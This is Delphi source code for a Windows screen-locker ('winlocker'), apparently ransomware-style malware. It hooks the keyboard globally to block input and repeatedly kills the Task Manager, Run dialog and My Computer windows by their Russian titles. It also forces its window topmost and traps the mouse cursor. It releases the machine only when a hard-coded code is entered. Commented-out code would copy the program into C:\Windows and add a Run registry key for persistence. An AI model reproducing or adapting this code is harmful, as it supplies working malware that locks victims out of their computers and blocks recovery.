unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ExtCtrls, Registry, XPMan;

type
  TForm1 = class(TForm)
    password: TEdit;
    Unlock: TButton;
    Timer1: TTimer;
    Button3: TButton;
    Button4: TButton;
    Button5: TButton;
    Button6: TButton;
    Button7: TButton;
    Button8: TButton;
    Button9: TButton;
    Button16: TButton;
    Button17: TButton;
    Button18: TButton;
    clear: TButton;
    winlockimage: TImage;
    procedure FormCreate(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure clearClick(Sender: TObject);
    procedure UnlockClick(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure Button5Click(Sender: TObject);
    procedure Button6Click(Sender: TObject);
    procedure Button8Click(Sender: TObject);
    procedure Button9Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button7Click(Sender: TObject);
    procedure Button16Click(Sender: TObject);
    procedure Button17Click(Sender: TObject);
    procedure Button18Click(Sender: TObject);
    procedure Button10Click(Sender: TObject);
  private
    { Private declarations }
  public
    procedure CreateWindowsRegions(const X, Y: Integer; const RegionHandle: THandle);
  end;

var
  Form1: TForm1;
  m_OldMHook: HHook = 0;
  k_OldKBHook: HHook = 0;
implementation

{$R *.dfm}

function KbHook(code: Integer; wparam: Word; lparam: LongInt): LongInt; stdcall;
begin
 if code < 0
 then Result := CallNextHookEx(k_oldKbHook, code, wparam, lparam)
 else Result := 1;
end;

procedure DelKey;
var
Reg: Tregistry;
begin
{
Reg:=TRegistry.Create;
Reg.RootKey:=HKEY_LOCAL_MACHINE;
Reg.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Run',true);
Reg.DeleteValue(Application.Title);
Reg.Free;
}
end;

procedure TForm1.CreateWindowsRegions(const X, Y: Integer;
  const RegionHandle: THandle);
var
 FirstRegion, CombineRegion : THandle;
begin
 FirstRegion := CreateRoundRectRGN(0 + X, 0 + Y, 650 + X, 410 + Y, 55, 55);
 CombineRegion := FirstRegion;
 SetWindowRGN(RegionHandle, CombineRegion, true);
end;

procedure TForm1.FormCreate(Sender: TObject);
var 
 Reg: TRegistry;
begin
{
CopyFile(PChar(ParamStr(0)), PChar('C:\Windows\' + ExtractFileName(ParamStr(0))), True);
Reg:=TRegistry.Create; 
Reg.RootKey:=HKEY_LOCAL_MACHINE; 
Reg.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Run',true); 
Reg.WriteString('baner','C:\Windows\baner.exe');
Reg.CloseKey; 
Reg.Free;
}
k_OldKbHook := SetWindowsHookEx(WH_KEYBOARD, @KbHook, HInstance, 0);
end;

procedure antio;
var
 tit:HWND;
begin
 tit:=FindWindow(nil, 'Диспетчер задач Windows');
 if (tit>0) then
 PostMessage(tit, WM_QUIT, 1, 0);
 tit:=FindWindow(nil, 'Запуск программы');
 if (tit>0) then
 PostMessage(tit, WM_QUIT, 1, 0);
 tit:=FindWindow(nil, 'Мой компьютер');
 if (tit>0) then
 PostMessage(tit, WM_QUIT, 1, 0);
end;

procedure TForm1.Timer1Timer(Sender: TObject);
var
curs: TRect;
begin
 antio;

 SetWindowPos(Handle,HWND_TOPMOST,Left,Top,Width,Height,SWP_NOACTIVATE Or SWP_NOMOVE Or SWP_NOSIZE);
 curs := Rect(Form1.Left+0, Form1.Top+0, Form1.Left + Form1.Width-0, Form1.Top + Form1.Height-0);
 ClipCursor(@curs);
end;

procedure TForm1.clearClick(Sender: TObject);
begin
 password.text:='';
end;

procedure TForm1.UnlockClick(Sender: TObject);
begin
if password.Text='2010' then
begin
{
password.visible:=false;
Button1.visible:=false;
clear.visible:=false;
button4.visible:=false;
button3.visible:=false;
button5.visible:=false;
button6.visible:=false;
button8.visible:=false;
button9.visible:=false;
button7.visible:=false;
button16.visible:=false;
button17.visible:=false;
button18.visible:=false;
}
 Close;
 DelKey;
end
else password.Text:='Неверный код';
end;

procedure TForm1.Button4Click(Sender: TObject);
begin
 password.text:=password.text+'1';
end;

procedure TForm1.Button5Click(Sender: TObject);
begin
 password.text:=password.text+'2';
end;

procedure TForm1.Button6Click(Sender: TObject);
begin
 password.text:=password.text+'3';
end;

procedure TForm1.Button8Click(Sender: TObject);
begin
 password.text:=password.text+'4';
end;

procedure TForm1.Button9Click(Sender: TObject);
begin
 password.text:=password.text+'5';
end;

procedure TForm1.Button3Click(Sender: TObject);
begin
 password.text:=password.text+'6';
end;

procedure TForm1.Button7Click(Sender: TObject);
begin
 password.text:=password.text+'7';
end;

procedure TForm1.Button16Click(Sender: TObject);
begin
 password.text:=password.text+'8';
end;

procedure TForm1.Button17Click(Sender: TObject);
begin
 password.text:=password.text+'9';
end;

procedure TForm1.Button18Click(Sender: TObject);
begin
 password.text:=password.text+'0';
end;

procedure TForm1.Button10Click(Sender: TObject);
begin
 Close;
end;

end.
